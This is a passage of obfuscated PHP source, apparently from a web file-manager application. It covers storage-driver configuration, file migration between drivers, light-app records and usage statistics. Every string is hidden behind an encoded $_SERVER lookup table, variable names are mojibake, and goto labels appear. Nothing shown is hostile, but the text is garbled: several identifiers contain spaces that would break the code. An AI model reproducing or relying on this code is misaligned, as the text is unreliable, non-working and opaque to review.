$‰‚’¥åª[2053] => $‰‚’¥åª[78]); $ÒÇÌŠı› = array($‰‚’¥åª[817] => array($‰‚’¥åª[7], $À§ùÏª°)); $Â­û€Äî = Model($‰‚’¥åª[780])->field($°Ä˜«ñÂ)->where($ÒÇÌŠı›)->group($‰‚’¥åª[817])->select(); $Â­û€Äî = array_to_keyvalue($Â­û€Äî, $‰‚’¥åª[395], $‰‚’¥åª[78]); Cache::set($™§°·Á†, $Â­û€Äî, 600); return $Â­û€Äî; } public function getConfig($™ò‚ÉèØ) { $ÂÈÄëã„ = parent::listData($™ò‚ÉèØ); return json_decode($ÂÈÄëã„[$_SERVER[¥ÙÌÜ¾ê][6]], !0); } public function update($£½ë‡œé, $±·¹ÌÙ) { $Æ³€Ç©‹ =& $_SERVER[¥ÙÌÜ¾ê]; $±ú“ıâ = $±·¹ÌÙ[$Æ³€Ç©‹[28]]; $ª­’©¯ñ = array_to_keyvalue(parent::listData(), $Æ³€Ç©‹[28]); if (isset($ª­’©¯ñ[$±ú“ıâ]) && $ª­’©¯ñ[$±ú“ıâ][$Æ³€Ç©‹[395]] != $£½ë‡œé) { return !1; } if (isset($±·¹ÌÙ[$Æ³€Ç©‹[2054]]) && $±·¹ÌÙ[$Æ³€Ç©‹[2054]] == $Æ³€Ç©‹[87]) { $this->checkConfig($±·¹ÌÙ); } unset($±·¹ÌÙ[$Æ³€Ç©‹[2054]]); $¬³Œ¯ç = parent::update($£½ë‡œé, $±·¹ÌÙ); if ($¬³Œ¯ç && $±·¹ÌÙ[$Æ³€Ç©‹[34]]) { foreach ($ª­’©¯ñ as $¨îÖ†) { if ($¨îÖ†[$Æ³€Ç©‹[34]] && $¨îÖ†[$Æ³€Ç©‹[395]] != $£½ë‡œé) { parent::update($¨îÖ†[$Æ³€Ç©‹[395]], array($Æ³€Ç©‹[34] => 0)); } } } return $¬³Œ¯ç; } public function add($Ï¦ü™Íø) { $¼‘äÚ¡Ù =& $_SERVER[¥ÙÌÜ¾ê]; $ùÍ´Óè³ = array_to_keyvalue(parent::listData(), $¼‘äÚ¡Ù[28]); if (isset($ùÍ´Óè³[$Ï¦ü™Íø[$¼‘äÚ¡Ù[28]]])) { return !1; } $this->checkConfig($Ï¦ü™Íø); $œÊüó†† = parent::insert($Ï¦ü™Íø); if ($œÊüó†† && $Ï¦ü™Íø[$¼‘äÚ¡Ù[34]]) { foreach ($ùÍ´Óè³ as $©ÂÑ¹Âê) { if ($©ÂÑ¹Âê[$¼‘äÚ¡Ù[34]]) { parent::update($©ÂÑ¹Âê[$¼‘äÚ¡Ù[395]], array($¼‘äÚ¡Ù[34] => 0)); } } } return $œÊüó††; } public function checkConfig(&$ñİüù¼Ò, $ÊÅ¶ºíÁ = false) { $õÕî ú =& $_SERVER[¥ÙÌÜ¾ê]; $ó¼È™ŸÅ = strtolower($ñİüù¼Ò[$õÕî ú[94]]); $Êßº¯¢ê = json_decode($ñİüù¼Ò[$õÕî ú[6]], !0); foreach ($Êßº¯¢ê as $Šäïó‘ş => $Ûâë¾Œ) { $Êßº¯¢ê[$Šäïó‘ş] = trim($Ûâë¾Œ); } $Êßº¯¢ê[$õÕî ú[2055]] = rand_string(6); $´“Ï­¯ = $GLOBALS[$õÕî ú[6]][$õÕî ú[88]][$õÕî ú[826]]; $×á«ñˆï = isset($´“Ï­¯[$ó¼È™ŸÅ]) ? $´“Ï­¯[$ó¼È™ŸÅ] : ucfirst($ó¼È™ŸÅ); $ìà‰ôµ´ = $õÕî ú[72] . $×á«ñˆï; if (!$×á«ñˆï || !class_exists($ìà‰ôµ´)) { if ($ÊÅ¶ºíÁ) { return LNG($õÕî ú[2056]); } write_log(array($õÕî ú[2057], $ñİüù¼Ò, get_caller_info()), $õÕî ú[2058]); show_json(LNG($õÕî ú[2056]), !1, $ñİüù¼Ò); } $£ÙŸú¦ç = new $ìà‰ôµ´($Êßº¯¢ê); if (in_array($ó¼È™ŸÅ, $£ÙŸú¦ç->objectDriver)) { if (!$£ÙŸú¦ç->isBucketCors() && !$£ÙŸú¦ç->setBucketCors()) { $‰–˜Æ“ˆ = LNG($õÕî ú[2059]); $‰–˜Æ“ˆ .= $õÕî ú[2060] . LNG($õÕî ú[2061]); if ($ÊÅ¶ºíÁ) { return $‰–˜Æ“ˆ; } show_json($‰–˜Æ“ˆ, !1); } } $²³œæı = rtrim($Êßº¯¢ê[$õÕî ú[1111]], $õÕî ú[8]) . $õÕî ú[8]; $˜Ã‹ï‡– = $£ÙŸú¦ç->getPath($²³œæı . $õÕî ú[1173]); if (!$£ÙŸú¦ç->mkfile($˜Ã‹ï‡–)) { if ($ÊÅ¶ºíÁ) { return LNG($õÕî ú[2059]); } show_json(LNG($õÕî ú[2059]), !1); } $Êßº¯¢ê[$õÕî ú[1111]] = $²³œæı; $ñİüù¼Ò[$õÕî ú[6]] = json_encode($Êßº¯¢ê); $ñİüù¼Ò[$õÕî ú[94]] = $×á«ñˆï; return !0; } public function driverListSystem() { $àó”“® =& $_SERVER[¥ÙÌÜ¾ê]; $¶ƒ½¿å½ = parent::listData(); $®Í§‚÷§ = array(); foreach ($¶ƒ½¿å½ as $†îİ€í) { unset($†îİ€í[$àó”“®[194]], $†îİ€í[$àó”“®[84]]); $†îİ€í[$àó”“®[6]] = json_decode($†îİ€í[$àó”“®[6]], !0); $®Í§‚÷§[] = $†îİ€í; } return $®Í§‚÷§; } public function defaultDriver() { $ô‹ù²›‡ =& $_SERVER[¥ÙÌÜ¾ê]; $Æèé«ê = parent::listData(); $§‚ÂÏ¦Ò = array_filter_by_field($Æèé«ê, $ô‹ù²›‡[34], 1); $§‚ÂÏ¦Ò = $§‚ÂÏ¦Ò[0]; if ($§‚ÂÏ¦Ò) { $§‚ÂÏ¦Ò[$ô‹ù²›‡[6]] = json_decode($§‚ÂÏ¦Ò[$ô‹ù²›‡[6]], !0); } return $§‚ÂÏ¦Ò; } public function driverInfo($õÏÎæÑ‰) { $èıü”–ï =& $_SERVER[¥ÙÌÜ¾ê]; $¯£Š”­— = array_to_keyvalue(parent::listData(), $èıü”–ï[395]); if (!isset($¯£Š”­—[$õÏÎæÑ‰])) { return !1; } $‘öŞºª = $¯£Š”­—[$õÏÎæÑ‰]; $‘öŞºª[$èıü”–ï[6]] = json_decode($‘öŞºª[$èıü”–ï[6]], !0); return $‘öŞºª; } public function remove($ÛÌ§ÁÃğ) { $this->removeShareItems($ÛÌ§ÁÃğ); return parent::remove($ÛÌ§ÁÃğ); } public function removeWithFile($‰áĞı‘, $¶ß÷¬ıÊ) { $éÚ©å¡« =& $_SERVER[¥ÙÌÜ¾ê]; $‡æ€óöÏ = array($éÚ©å¡«[817] => $‰áĞı‘); $£È¸çĞ = Model($éÚ©å¡«[464])->where($‡æ€óöÏ)->count(); $²‘ª°ã = Model($éÚ©å¡«[464])->where($‡æ€óöÏ)->sum($éÚ©å¡«[78]); $¥·»¤Šğ = $¶ß÷¬ıÊ . $éÚ©å¡«[2062] . $‰áĞı‘; $œÑ´€³Š = new TaskFileTransfer($¥·»¤Šğ, $éÚ©å¡«[2058], $£È¸çĞ, LNG($éÚ©å¡«[2063]) . "\x28{$‰áĞı‘}\51"); $œÑ´€³Š->task[$éÚ©å¡«[756]] = (double) $²‘ª°ã; $è×Ç®óŒ = KodIO::defaultDriver(); $íä¢´‚ = $è×Ç®óŒ[$éÚ©å¡«[395]]; $Ñ´—·¶ç = "\173\x69\x6f\x3a{$íä¢´‚}\x7d\57"; $âòÏÈñ = !0; $±©ß¸ü— = array(); $Ó¯óòÆÜ = Model($éÚ©å¡«[193])->where($‡æ€óöÏ)->field($éÚ©å¡«[2064])->select(); foreach ($Ó¯óòÆÜ as $©¦‰şİ) { $‡¼æ®şƒ = $©¦‰şİ[$éÚ©å¡«[76]]; $Æ¯Ì¿Åà = $Ñ´—·¶ç . str_replace("\173\x69\x6f\x3a{$‰áĞı‘}\175\x2f", $éÚ©å¡«[33], $‡¼æ®şƒ); if (!IO::exist($‡¼æ®şƒ)) { $±©ß¸ü—[] = $©¦‰şİ[$éÚ©å¡«[461]]; $œÑ´€³Š->updateFileEnd($©¦‰şİ[$éÚ©å¡«[28]], $©¦‰şİ[$éÚ©å¡«[78]]); continue; } if (IO::exist($Æ¯Ì¿Åà)) { $œÑ´€³Š->updateFileEnd($©¦‰şİ[$éÚ©å¡«[28]], $©¦‰şİ[$éÚ©å¡«[78]]); continue; } if (!IO::move($‡¼æ®şƒ, get_path_father($Æ¯Ì¿Åà))) { $âòÏÈñ = !1; break; } $‡æ€óöÏ = array($éÚ©å¡«[461] => $©¦‰şİ[$éÚ©å¡«[461]]); $©õĞÍåÃ = array($éÚ©å¡«[817] => $íä¢´‚, $éÚ©å¡«[76] => $Æ¯Ì¿Åà); Model($éÚ©å¡«[193])->where($‡æ€óöÏ)->save($©õĞÍåÃ); } $this->removeByFileID($±©ß¸ü—); if (!$âòÏÈñ) { $œÑ´€³Š->stop($¥·»¤Šğ); return !1; } $œÑ´€³Š->end(); if ($¶ß÷¬ıÊ == $éÚ©å¡«[1717]) { $this->remove($‰áĞı‘); } } public function progress($ÃÛÈÊÑ•, $ã«´ÆÈœ) { return Task::get($ã«´ÆÈœ . $_SERVER[¥ÙÌÜ¾ê][2062] . $ÃÛÈÊÑ•); } private function removeByFileID($èÅ¢äşĞ = array()) { $‘’ä·Èú =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($èÅ¢äşĞ)) { return; } $·Íö·ÊŸ = array($‘’ä·Èú[461] => array($‘’ä·Èú[7], $èÅ¢äşĞ)); $âÃ¹©»ê = Model($‘’ä·Èú[1253])->where($·Íö·ÊŸ)->field($‘’ä·Èú[397])->select(); if (!$âÃ¹©»ê) { return; } $âÃ¹©»ê = array_to_keyvalue($âÃ¹©»ê, $‘’ä·Èú[33], $‘’ä·Èú[397]); foreach ($âÃ¹©»ê as $™ÍÓ¹¼„) { Model($‘’ä·Èú[411])->removeNow($™ÍÓ¹¼„, !1); } } private function removeShareItems($¤ùÎÊéæ) { $üğı• =& $_SERVER[¥ÙÌÜ¾ê]; $ÁÚˆøØŸ = "\173\x69\157\x3a{$¤ùÎÊéæ}\x7d\x2f"; $ùµèÄì = array($üğı•[397] => 0, $üğı•[1106] => array($üğı•[381], "{$ÁÚˆøØŸ}\x25")); $Ÿ”Êé¶ = Model($üğı•[1728])->where($ùµèÄì)->field($üğı•[482])->select(); if (empty($Ÿ”Êé¶)) { return; } $±×Ú–…ı = array_to_keyvalue($Ÿ”Êé¶, $üğı•[33], $üğı•[482]); Model($üğı•[589])->remove($±×Ú–…ı); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\114\151\147\150\164\101\160\160"; public $modelType = "\x53\171\x73\164\x65\155\x4f\x70\164\151\157\x6e"; public $field = array("\156\x61\x6d\145", "\147\162\157\165\x70", "\144\145\x73\143", "\143\x6f\x6e\x74\145\156\164"); public function listData($âÖ‘ğÀ‡ = false, $²Û¼Ÿºˆ = "\x6d\x6f\x64\x69\146\171\124\x69\x6d\x65", $¾ı¨ïş = true) { return parent::listData($âÖ‘ğÀ‡, $²Û¼Ÿºˆ, $¾ı¨ïş); } public function remove($éµÓ”¡) { $ŞÊğóÍ = $this->findByName($éµÓ”¡); if (!$ŞÊğóÍ) { return !1; } return parent::remove($ŞÊğóÍ[$_SERVER[¥ÙÌÜ¾ê][395]]); } public function add($ÌÈÀØÅ’) { if ($this->findByName($ÌÈÀØÅ’[$_SERVER[¥ÙÌÜ¾ê][28]])) { return !1; } return parent::insert($ÌÈÀØÅ’); } public function update($ò»ú°˜š, $ìÅ¼‡©ø) { $®¯ú =& $_SERVER[¥ÙÌÜ¾ê]; $«Ç÷È÷¹ = $this->findByName($ò»ú°˜š); $Ø€¥ôå› = $this->findByName($ìÅ¼‡©ø[$®¯ú[28]]); if (!$«Ç÷È÷¹ || $Ø€¥ôå› && $Ø€¥ôå›[$®¯ú[395]] != $«Ç÷È÷¹[$®¯ú[395]]) { return !1; } return parent::update($«Ç÷È÷¹[$®¯ú[395]], $ìÅ¼‡©ø); } } goto bÀƒØƒñÅË; A¢—Ô†ª¼˜: class AnalysisModel extends ModelBaseLight { public function init($ŸƒÆ£•™) { $Å³ÁùÔ• =& $_SERVER[¥ÙÌÜ¾ê]; $³ÒŠ»¿¾ = array($Å³ÁùÔ•[588] => array($Å³ÁùÔ•[29] => $Å³ÁùÔ•[1677], $Å³ÁùÔ•[271] => array($Å³ÁùÔ•[222], $Å³ÁùÔ•[758], $Å³ÁùÔ•[1678], $Å³ÁùÔ•[1679])), $Å³ÁùÔ•[1680] => array($Å³ÁùÔ•[29] => $Å³ÁùÔ•[1681], $Å³ÁùÔ•[271] => array($Å³ÁùÔ•[222], $Å³ÁùÔ•[756], $Å³ÁùÔ•[1682], $Å³ÁùÔ•[1683], $Å³ÁùÔ•[1684]))); if (!isset($³ÒŠ»¿¾[$ŸƒÆ£•™])) { return !1; } $this->optionType = $³ÒŠ»¿¾[$ŸƒÆ£•™][$Å³ÁùÔ•[29]]; $this->field = $³ÒŠ»¿¾[$ŸƒÆ£•™][$Å³ÁùÔ•[271]]; return !0; } public function listData($Âèı™™ = false, $¢áÂüóÑ = "\155\x6f\x64\151\x66\x79\124\x69\x6d\145", $±Ûó‰áâ = false) { return parent::listData($Âèı™™, $¢áÂüóÑ, $±Ûó‰áâ); } public function trendList($—•³”˜„) { $Í²Ñ±‡© =& $_SERVER[¥ÙÌÜ¾ê]; $Åá‚®†å = $this->listData(); if ($Åá‚®†å) { $İ†–µÕ = end($Åá‚®†å); $Œ­¥Ï®ø = date($Í²Ñ±‡©[1685], strtotime($Í²Ñ±‡©[1686])); if ($İ†–µÕ[$Í²Ñ±‡©[222]] == $Œ­¥Ï®ø) { return $Åá‚®†å; } $İ—´€ø† = strtotime($İ†–µÕ[$Í²Ñ±‡©[222]]); } if (!isset($İ—´€ø†)) { $¸¢Ñ¬ÔÜ = $—•³”˜„ == $Í²Ñ±‡©[588] ? $Í²Ñ±‡©[532] : $Í²Ñ±‡©[825]; $İ—´€ø† = Model($¸¢Ñ¬ÔÜ)->min($Í²Ñ±‡©[194]); } $”ô©ŸèÁ = $Í²Ñ±‡©[1687] . ucfirst($—•³”˜„); $±™–³æ = $this->dateList($İ—´€ø†); foreach ($±™–³æ as $Œ­¥Ï®ø) { $this->{$”ô©ŸèÁ}($Œ­¥Ï®ø); } return $this->listData(); } private function dateList($ÏË¤‘íè) { $ÛÍ¯ÃÉä =& $_SERVER[¥ÙÌÜ¾ê]; $—°ò‰ñ» = $ÏË¤‘íè; $“Ìø³ïØ = strtotime($ÛÍ¯ÃÉä[1686]); $ÇÍğ½íë = array(); while ($—°ò‰ñ» <= $“Ìø³ïØ) { $ÇÍğ½íë[] = date($ÛÍ¯ÃÉä[1685], $—°ò‰ñ»); $—°ò‰ñ» = strtotime($ÛÍ¯ÃÉä[1688], $—°ò‰ñ»); } return $ÇÍğ½íë; } public function _recordUser($•Œ¢æŸ = '') { $®âöóÃ =& $_SERVER[¥ÙÌÜ¾ê]; $ÊÖ­öĞş = strtotime(date($®âöóÃ[1689], strtotime($•Œ¢æŸ))); $ÖÛğÓ¹¹ = strtotime(date($®âöóÃ[1690], strtotime($•Œ¢æŸ))); $‰™ˆŞ¢® = array($®âöóÃ[194] => array($®âöóÃ[1009], $ÖÛğÓ¹¹)); $¨§Ş‹ü = Model($®âöóÃ[532])->where($‰™ˆŞ¢®)->count($®âöóÃ[1581]); $‰™ˆŞ¢®[$®âöóÃ[194]] = array($®âöóÃ[331], array($ÊÖ­öĞş, $ÖÛğÓ¹¹)); $ó½ÍÊšØ = Model($®âöóÃ[532])->where($‰™ˆŞ¢®)->count($®âöóÃ[1581]); $‰™ˆŞ¢®[$®âöóÃ[29]] = $®âöóÃ[1691]; $èÆ¢‰Âã = Model($®âöóÃ[1692])->where($‰™ˆŞ¢®)->count($®âöóÃ[1693]); $Áª ×šÃ = array($®âöóÃ[222] => $•Œ¢æŸ, $®âöóÃ[758] => (int) $¨§Ş‹ü, $®âöóÃ[1678] => (int) $ó½ÍÊšØ, $®âöóÃ[1679] => (int) $èÆ¢‰Âã); return $this->insert($Áª ×šÃ); } public function _recordStore($¹Ğ€¦¨ = '') { $­¾¿§Äí =& $_SERVER[¥ÙÌÜ¾ê]; $²ÓÀºÀ = strtotime(date($­¾¿§Äí[1690], strtotime($¹Ğ€¦¨))); $É¸ëù¹Ë = array($­¾¿§Äí[194] => array($­¾¿§Äí[1009], $²ÓÀºÀ)); $Á†ûÎÍ© = Model($­¾¿§Äí[464])->where($É¸ëù¹Ë)->sum($­¾¿§Äí[78]); $É¸ëù¹Ë[$­¾¿§Äí[405]] = 0; $³«ü™Â‘ = Model($­¾¿§Äí[825])->where($É¸ëù¹Ë)->sum($­¾¿§Äí[78]); $É¸ëù¹Ë[$­¾¿§Äí[406]] = 1; $¿å›ô = Model($­¾¿§Äí[825])->where($É¸ëù¹Ë)->sum($­¾¿§Äí[78]); $É¸ëù¹Ë[$­¾¿§Äí[406]] = 2; $”ëÔŒÒ« = Model($­¾¿§Äí[825])->where($É¸ëù¹Ë)->sum($­¾¿§Äí[78]); $şù˜Õ = array($­¾¿§Äí[222] => $¹Ğ€¦¨, $­¾¿§Äí[756] => (int) $³«ü™Â‘, $­¾¿§Äí[1682] => (int) $Á†ûÎÍ©, $­¾¿§Äí[1683] => (int) $¿å›ô, $­¾¿§Äí[1684] => (int) $”ëÔŒÒ«); return $this->insert($şù˜Õ); } public function trend($éœâÜ±¹, $ïÛ¾÷•) { $¦ÆÂÕÄ¹ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->init($éœâÜ±¹)) { return !1; } $ó’´µ¨í = $this->trendList($éœâÜ±¹); if ($ó’´µ¨í && $ïÛ¾÷• != $¦ÆÂÕÄ¹[1554]) { $­ŠÍˆŸ = $ó’´µ¨í[0][$¦ÆÂÕÄ¹[222]]; $õ´şÔİ = $this->validDate($ïÛ¾÷•, $­ŠÍˆŸ); $èä—¹ùØ = array(); $˜¹Ïßéƒ = array_to_keyvalue($ó’´µ¨í, $¦ÆÂÕÄ¹[222]); foreach ($õ´şÔİ as $Âåºë·«) { if (isset($˜¹Ïßéƒ[$Âåºë·«])) { $òÈİ¤‚ = $˜¹Ïßéƒ[$Âåºë·«]; } else { $òÈİ¤‚ = end($ó’´µ¨í); $òÈİ¤‚[$¦ÆÂÕÄ¹[222]] = $Âåºë·«; if ($éœâÜ±¹ == $¦ÆÂÕÄ¹[588]) { $òÈİ¤‚[$¦ÆÂÕÄ¹[1678]] = $òÈİ¤‚[$¦ÆÂÕÄ¹[1679]] = 0; } } $èä—¹ùØ[] = $òÈİ¤‚; } $ó’´µ¨í = $èä—¹ùØ; } $Ì¬ùÎ¹ = array($¦ÆÂÕÄ¹[588] => array($¦ÆÂÕÄ¹[758] => LNG($¦ÆÂÕÄ¹[1694]), $¦ÆÂÕÄ¹[1678] => LNG($¦ÆÂÕÄ¹[1695]), $¦ÆÂÕÄ¹[1679] => LNG($¦ÆÂÕÄ¹[1696])), $¦ÆÂÕÄ¹[1680] => array($¦ÆÂÕÄ¹[756] => LNG($¦ÆÂÕÄ¹[1697]), $¦ÆÂÕÄ¹[1682] => LNG($¦ÆÂÕÄ¹[1698]), $¦ÆÂÕÄ¹[1683] => LNG($¦ÆÂÕÄ¹[1699]), $¦ÆÂÕÄ¹[1684] => LNG($¦ÆÂÕÄ¹[1700]))); $äÇ’İ¢– = array($¦ÆÂÕÄ¹[588] => $¦ÆÂÕÄ¹[1701], $¦ÆÂÕÄ¹[1680] => $¦ÆÂÕÄ¹[78]); if (empty($ó’´µ¨í)) { $Âåºë·« = date($¦ÆÂÕÄ¹[1685], strtotime($¦ÆÂÕÄ¹[1686])); $âÁ–¤ñø = array($¦ÆÂÕÄ¹[222] => $Âåºë·«); foreach ($Ì¬ùÎ¹[$éœâÜ±¹] as $­ªşİÇ => $†˜úÏÒÔ) { $âÁ–¤ñø[$­ªşİÇ] = 0; } $ó’´µ¨í[] = $âÁ–¤ñø; } $ôàüı²ş = array(); foreach ($ó’´µ¨í as $†˜úÏÒÔ) { if ($éœâÜ±¹ == $¦ÆÂÕÄ¹[1680] && $†˜úÏÒÔ[$¦ÆÂÕÄ¹[1682]] > $†˜úÏÒÔ[$¦ÆÂÕÄ¹[756]]) { $†˜úÏÒÔ[$¦ÆÂÕÄ¹[1682]] = $†˜úÏÒÔ[$¦ÆÂÕÄ¹[756]]; } foreach ($Ì¬ùÎ¹[$éœâÜ±¹] as $­ªşİÇ => $”ˆ¸ƒ®Ù) { $òÈİ¤‚ = array($¦ÆÂÕÄ¹[222] => $†˜úÏÒÔ[$¦ÆÂÕÄ¹[222]], $¦ÆÂÕÄ¹[1481] => $”ˆ¸ƒ®Ù); $òÈİ¤‚[$äÇ’İ¢–[$éœâÜ±¹]] = isset($†˜úÏÒÔ[$­ªşİÇ]) ? $†˜úÏÒÔ[$­ªşİÇ] : 0; $ôàüı²ş[] = $òÈİ¤‚; } } return $ôàüı²ş; } public function validDate($ªñ‘²ŞÅ, $¡ÕÍã’Õ) { $Úëîİ¿Ï =& $_SERVER[¥ÙÌÜ¾ê]; $°ÇÖ°æÛ = date($Úëîİ¿Ï[1685], strtotime($Úëîİ¿Ï[1686])); $³ŒøÚÑ = array($°ÇÖ°æÛ); switch ($ªñ‘²ŞÅ) { case $Úëîİ¿Ï[1561]: $ÚŒÙ¤¤Ê = mktime(0, 0, 0, date($Úëîİ¿Ï[1702]), date($Úëîİ¿Ï[1301]) - date($Úëîİ¿Ï[1362]) + 7 - 7, date($Úëîİ¿Ï[1703])); $ÙÓÏøÉ½ = 0; do { $»—â®©Ÿ = date($Úëîİ¿Ï[1685], $ÚŒÙ¤¤Ê - 3600 * 24 * 7 * $ÙÓÏøÉ½); $³ŒøÚÑ[] = $»—â®©Ÿ; $ÙÓÏøÉ½++; } while ($¡ÕÍã’Õ < $»—â®©Ÿ); break; case $Úëîİ¿Ï[1559]: $ÙÓÏøÉ½ = 1; do { $Å³ãˆè = date($Úëîİ¿Ï[1704], strtotime("\55\x20{$ÙÓÏøÉ½}\40\x6d\157\x6e\x74\150\163")); $³ŒøÚÑ[] = $Å³ãˆè; $ÙÓÏøÉ½++; } while ($¡ÕÍã’Õ < $Å³ãˆè); break; case $Úëîİ¿Ï[1705]: $ìõ´ëÔ¸ = (int) date($Úëîİ¿Ï[1703], strtotime($¡ÕÍã’Õ)); $Àëô…–¸ = (int) date($Úëîİ¿Ï[1703]); if ($ìõ´ëÔ¸ >= $Àëô…–¸) { break; } for ($ìõ´ëÔ¸; $ìõ´ëÔ¸ < $Àëô…–¸; $ìõ´ëÔ¸++) { $³ŒøÚÑ[] = $ìõ´ëÔ¸ . $Úëîİ¿Ï[1706]; } break; default: break; } if ($¡ÕÍã’Õ > end($³ŒøÚÑ)) { array_pop($³ŒøÚÑ); } sort($³ŒøÚÑ); return $³ŒøÚÑ; } public function listTable($ÕŞØ˜Ì—) { $ú¤¥´”æ = ucfirst($ÕŞØ˜Ì—); return Model($ú¤¥´”æ)->listData(); } public function option($¢ƒÓİšÚ) { $æ›™†å = $_SERVER[¥ÙÌÜ¾ê][1707] . ucfirst($¢ƒÓİšÚ); return $this->{$æ›™†å}(); } private function optionUser() { $•ÃÆåõ¾ =& $_SERVER[¥ÙÌÜ¾ê]; $Ûã«Ú¶˜ = Model($•ÃÆåõ¾[532])->count($•ÃÆåõ¾[1581]); $ğ¶òú£ = Model($•ÃÆåõ¾[532])->where($•ÃÆåõ¾[1708])->count($•ÃÆåõ¾[1581]); $µ¶Èä¼¨ = intval($GLOBALS[$•ÃÆåõ¾[6]][$•ÃÆåõ¾[347]][$•ÃÆåõ¾[1537]]) / 3600; $·Óï®šÛ = strtotime("\55{$µ¶Èä¼¨}\40\150\157\165\x72\x73"); $†ï…ìáä = strtotime(date($•ÃÆåõ¾[1689])); if ($·Óï®šÛ < $†ï…ìáä) { $·Óï®šÛ = $†ï…ìáä; } $ÛÊŞäôı = array($•ÃÆåõ¾[1709] => array($•ÃÆåõ¾[1010], $·Óï®šÛ)); $ÔãíÀ = (int) Model($•ÃÆåõ¾[532])->where($ÛÊŞäôı)->count($•ÃÆåõ¾[1581]); if (!$ÔãíÀ) { $ÔãíÀ = 1; } $ÛÊŞäôı = array($•ÃÆåõ¾[1709] => array($•ÃÆåõ¾[1010], $†ï…ìáä)); $¹™É£ä = Model($•ÃÆåõ¾[532])->where($ÛÊŞäôı)->count($•ÃÆåõ¾[1581]); return array($•ÃÆåõ¾[752] => (int) $Ûã«Ú¶˜, $•ÃÆåõ¾[1710] => (int) ($Ûã«Ú¶˜ - $ğ¶òú£), $•ÃÆåõ¾[1711] => (int) $ğ¶òú£, $•ÃÆåõ¾[1712] => (int) $¹™É£ä, $•ÃÆåõ¾[1713] => $ÔãíÀ); } private function optionFile() { $ü‡ò¥‘Ä =& $_SERVER[¥ÙÌÜ¾ê]; $¡“ÚÖã = $this->sourceSize(); $ì’À§ = $¡“ÚÖã[$ü‡ò¥‘Ä[78]]; $µÏ›ã¿™ = $¡“ÚÖã[$ü‡ò¥‘Ä[1682]]; $ô£´™¬‹ = Model($ü‡ò¥‘Ä[825])->where(array($ü‡ò¥‘Ä[405] => 0))->count($ü‡ò¥‘Ä[397]); $‰½½¶ó = array($ü‡ò¥‘Ä[405] => 0, $ü‡ò¥‘Ä[194] => array($ü‡ò¥‘Ä[1010], strtotime(date($ü‡ò¥‘Ä[1689])))); $ıêŒ¹º = Model($ü‡ò¥‘Ä[825])->where($‰½½¶ó)->sum($ü‡ò¥‘Ä[78]); $Ïª„ºô× = Model($ü‡ò¥‘Ä[825])->where($‰½½¶ó)->count($ü‡ò¥‘Ä[397]); return array($ü‡ò¥‘Ä[756] => $ì’À§, $ü‡ò¥‘Ä[1682] => $µÏ›ã¿™, $ü‡ò¥‘Ä[1714] => $ì’À§ - $µÏ›ã¿™, $ü‡ò¥‘Ä[1715] => (int) $ıêŒ¹º, $ü‡ò¥‘Ä[758] => (int) $ô£´™¬‹, $ü‡ò¥‘Ä[1716] => (int) $Ïª„ºô×); } private function optionAccess() { $×íÔÄÙ =& $_SERVER[¥ÙÌÜ¾ê]; return array($×íÔÄÙ[752] => $this->typeLogCnt(), $×íÔÄÙ[107] => $this->typeLogCnt($×íÔÄÙ[107]), $×íÔÄÙ[444] => $this->typeLogCnt($×íÔÄÙ[444]), $×íÔÄÙ[1717] => $this->typeLogCnt($×íÔÄÙ[1717]), $×íÔÄÙ[1718] => $this->typeLogCnt($×íÔÄÙ[1718]), $×íÔÄÙ[588] => $this->typeLogCnt($×íÔÄÙ[33], $×íÔÄÙ[1693])); } private function typeLogCnt($í­Õñìø = '', $Ã¸˜òà = "\151\144") { $Úò±ÛÓÉ =& $_SERVER[¥ÙÌÜ¾ê]; $™Ï€·Éë = array($Úò±ÛÓÉ[107] => array($Úò±ÛÓÉ[1719], $Úò±ÛÓÉ[1720]), $Úò±ÛÓÉ[444] => array($Úò±ÛÓÉ[1721], $Úò±ÛÓÉ[1722]), $Úò±ÛÓÉ[1717] => array($Úò±ÛÓÉ[1723], $Úò±ÛÓÉ[1724], $Úò±ÛÓÉ[1725]), $Úò±ÛÓÉ[1718] => array($Úò±ÛÓÉ[1726], $Úò±ÛÓÉ[1727]), $Úò±ÛÓÉ[1728] => array($Úò±ÛÓÉ[1729], $Úò±ÛÓÉ[1730], $Úò±ÛÓÉ[1731])); $«Ñ¥ïıÏ = strtotime(date($Úò±ÛÓÉ[1689])); $öÃ‘Á´Ú = array($Úò±ÛÓÉ[194] => array($Úò±ÛÓÉ[1010], $«Ñ¥ïıÏ)); if ($í­Õñìø) { $öÃ‘Á´Ú[$Úò±ÛÓÉ[29]] = array($Úò±ÛÓÉ[7], $™Ï€·Éë[$í­Õñìø]); } $¾ŞûêÙ˜ = Model($Úò±ÛÓÉ[1692])->where($öÃ‘Á´Ú)->count($Ã¸˜òà); return (int) $¾ŞûêÙ˜; } private function optionServer() { $ÑÙÑó™ì =& $_SERVER[¥ÙÌÜ¾ê]; $ä’ÌÚ´ = $this->diskDriver(); $ı¯Í²ˆ² = KodIO::defaultDriver(); $¼½ç÷ê = array($ÑÙÑó™ì[817] => $ı¯Í²ˆ²[$ÑÙÑó™ì[395]]); $èş–ºØ¤ = Model($ÑÙÑó™ì[464])->where($¼½ç÷ê)->sum($ÑÙÑó™ì[78]); $¾æÉˆÚ = explode($ÑÙÑó™ì[50], $_SERVER[$ÑÙÑó™ì[142]]); $…ğíÒ¸ª = $¾æÉˆÚ[0]; $¨×—«½× = $GLOBALS[$ÑÙÑó™ì[6]][$ÑÙÑó™ì[17]]; $Ÿ¾ƒ­Ô¬ = $¨×—«½×[$ÑÙÑó™ì[971]]; if ($Ÿ¾ƒ­Ô¬ == $ÑÙÑó™ì[790]) { $ÁÑ€ÌÑõ = explode($ÑÙÑó™ì[1202], $¨×—«½×[$ÑÙÑó™ì[970]]); $Ÿ¾ƒ­Ô¬ = $ÁÑ€ÌÑõ[0]; } if ($Ÿ¾ƒ­Ô¬ == $ÑÙÑó™ì[793] || $Ÿ¾ƒ­Ô¬ == $ÑÙÑó™ì[794]) { $ ºéÊ¯ = Model()->db()->query($ÑÙÑó™ì[1732]); $æÒˆı‹ = $ ºéÊ¯[0] && isset($ ºéÊ¯[0][$ÑÙÑó™ì[1480]]) ? $ ºéÊ¯[0][$ÑÙÑó™ì[1480]] : 0; $Ÿ¾ƒ­Ô¬ = $ÑÙÑó™ì[1733] . ($æÒˆı‹ ? $ÑÙÑó™ì[8] . $æÒˆı‹ : $ÑÙÑó™ì[33]); } 